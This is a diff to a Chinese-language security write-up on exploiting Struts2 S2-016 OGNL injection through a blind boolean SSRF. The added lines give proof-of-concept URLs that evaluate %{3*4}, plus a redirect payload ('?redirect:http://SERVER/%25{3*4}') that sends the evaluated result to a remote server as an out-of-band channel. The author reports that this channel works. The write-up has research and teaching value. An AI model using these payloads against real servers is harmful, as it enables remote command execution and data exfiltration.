@@ -57,5 +57,13 @@ Struts2漏洞的影响大家都懂的, 通过URL直接远程命令执行, 想打
 获取Payload Result是十分有必要的, 这里的Payload Result和非Bool型SSRF的Result不是一个意思. 对于Bool型SSRF, 服务器端返回的数据永远只有True和False, 我们是可以通过返回的True或者False来判断Payload的执行状态, 但是这样的判断标准是无法让人信服的. 能否有一种方法能够精确的判断Payload的执行状态,而且能够返回Payload Result. 对于Struts2我找到了一种可利用的方法.
 
 #### 0x04 Struts2在Bool型SSRF中的利用
+下面是S2-016的POC:
 
+`/action?action:%25{3*4}`
+`/action?action?redirect:%25{3*4}`
+
+通过对连个POC的理解, 我们知道下面的POC中的redirect是实现URL跳转,通过URL跳转来验证S2-016漏洞.
+![Struts2-redirect](./res/Struts2-redirect.png)
+当然也可以通过 "?redirect:http://www.baidu.com" 来验证. 那么我们是否可以通过 "?redirect:http://SERVER/%25{3*4}" 将%25{3*4}的执行结果作为SERVER的URL的一部分发送到远端服务器, 通过实验我们证实了这样的想法.
+![Struts2-redirect-to-remote](./Res/Struts2-redirect-to-remote.png)
 #### 0x05 Other(想到什么写什么)
